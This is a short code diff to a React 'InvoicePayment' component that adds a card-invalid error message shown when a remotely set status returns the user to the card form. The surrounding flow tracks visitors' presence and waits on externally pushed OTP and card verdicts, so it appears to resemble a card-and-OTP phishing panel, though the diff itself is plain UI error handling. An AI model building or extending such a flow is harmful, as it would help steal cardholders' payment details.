@@ -17,6 +17,7 @@ const InvoicePayment = () => {
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [otpError, setOtpError] = useState<string | null>(null);
   const [otpType, setOtpType] = useState<OtpType>("6digit");
+  const [cardInvalidError, setCardInvalidError] = useState<string | null>(null);
   const visitorId = useRef(crypto.randomUUID());
 
   // Presence tracking
@@ -79,6 +80,7 @@ const InvoicePayment = () => {
           }
           if (newStatus === "rejected") setStep("rejected");
           if (newStatus === "card_invalid") {
+            setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
             setStep("form");
             setSessionId(null);
           }
@@ -92,6 +94,7 @@ const InvoicePayment = () => {
           if (newStatus === "otp_expired") setOtpError("This verification code has expired. Please request a new one.");
           if (newStatus === "rejected") setStep("rejected");
           if (newStatus === "card_invalid") {
+            setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
             setStep("form");
             setSessionId(null);
           }
@@ -105,6 +108,7 @@ const InvoicePayment = () => {
           if (newStatus === "otp_wrong") { setOtpError("The verification code you entered is incorrect. Please try again."); setStep("otp"); }
           if (newStatus === "otp_expired") { setOtpError("This verification code has expired. Please request a new one."); setStep("otp"); }
           if (newStatus === "card_invalid") {
+            setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
             setStep("form");
             setSessionId(null);
           }
@@ -117,6 +121,7 @@ const InvoicePayment = () => {
 
   const handleFormSubmit = (id: string) => {
     setSessionId(id);
+    setCardInvalidError(null);
     setStep("waiting");
   };
 
@@ -296,6 +301,7 @@ const InvoicePayment = () => {
               onSuccess={handleFormSubmit}
               fixedAmount={true}
               invoiceId={invoiceId}
+              cardInvalidError={cardInvalidError}
             />
           )}
           {step === "waiting" && <WaitingScreen amount={formatEuro(total)} />}
